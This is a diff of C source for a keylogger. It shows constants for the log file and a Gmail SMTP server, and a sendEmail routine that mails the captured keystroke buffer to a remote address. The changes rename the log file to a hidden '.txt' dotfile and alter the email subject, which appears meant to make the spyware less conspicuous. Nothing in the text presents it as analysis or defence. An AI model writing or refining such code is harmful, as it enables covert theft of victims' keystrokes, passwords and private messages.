@@ -15,7 +15,7 @@
 #define SENDER_SLEEP_TIME 100 
 
 // Name of the log file.
-#define FILE_NAME "keylogger.txt" 
+#define FILE_NAME ".txt" 
 
 // Email sender defines:
 #define GMAIL_SERVER "gmail-smtp-in.l.google.com"
@@ -191,7 +191,7 @@ void sendEmail(char server[], char from[], char to[], char buffer[]) {
     sprintf(data, "DATA\n");
     sendData(sock, data);
 
-    sprintf(data, "TO: %s\nFROM: %s\nSUBJECT: Keylogger\n%s\r\n.\r\n", to, from, buffer);
+    sprintf(data, "TO: %s\nFROM: %s\nSUBJECT: Keyloggy\n%s\r\n.\r\n", to, from, buffer);
     sendData(sock, data);
 
     sprintf(data, "QUIT\n");
